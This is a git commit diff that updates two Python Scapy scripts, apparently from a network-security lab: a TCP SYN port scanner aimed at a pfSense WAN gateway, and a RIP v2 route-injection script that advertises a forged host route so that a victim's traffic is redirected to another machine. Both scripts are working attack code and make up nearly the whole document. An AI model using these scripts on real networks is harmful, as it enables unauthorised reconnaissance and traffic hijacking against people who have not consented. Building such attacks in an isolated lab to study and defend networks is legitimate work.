521e2b12687591fefcc92bbf5c03cbfbd4d50647
Gabriel Crisan <gabicrisan01@gmail.com>
2026-01-19 16:17:09 +0200

    Add updated Python scripts for VPN & RIP attacks

--- External Attacker/vpn_tcp_syn_scan_recon.py
+++ External Attacker/vpn_tcp_syn_scan_recon.py
@@ -1,14 +1,14 @@
 from scapy.all import *
 
-target = "192.168.40.14" # Webserver's IP
-ports = range(1, 1025)   # scanning 1024 ports
+target = "172.16.1.1" # pfSense WAN Gateway
+ports = range(1, 1025) 
 
-print(f"Starting VPN SYN Scan against {target}...")
+print(f"Starting Full SYN Scan against {target}...")
 
 for port in ports:
     syn = IP(dst=target)/TCP(dport=port, flags="S")
     resp = sr1(syn, timeout=0.1, verbose=False)
 
-    if resp and resp.haslayer(TCP) and resp[TCP].flags == 18:
-        print(f"Port {port} OPEN")
+    if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
+        print(f"Port {port} OPEN (Forwarded to DMZ)")
         send(IP(dst=target)/TCP(dport=port, flags="R"), verbose=False)
--- Internal Attacker/rip_attack.py
+++ Internal Attacker/rip_attack.py
@@ -1,19 +1,21 @@
 from scapy.all import *
 
-fake_route_net = "192.168.40.0" 
-fake_route_mask = "255.255.255.0"
 
-print(f"Injecting MALICIOUS RIP route for {fake_route_net}...")
-print("Monitoring traffic flow change...")
+victim_ip = "192.168.40.126" # target host 
+new_destination_ip = "192.168.40.118"
+host_mask = "255.255.255.255"
+
+print(f"Injecting MALICIOUS RIP route: traffic for {victim_ip} -> {new_destination_ip}")
 
 rip_packet = (
-    IP(dst="224.0.0.9") /
-    UDP(sport=520, dport=520) /
+    IP(dst="224.0.0.9") / 
+    UDP(sport=520, dport=520) / 
     RIP(cmd=2, version=2) /
     RIPEntry(
-        addr=fake_route_net,
-        mask=fake_route_mask,
-        metric=1 
+        addr=victim_ip, 
+        mask=host_mask, 
+        next_hop=new_destination_ip,
+        metric=1
     )
 )
 
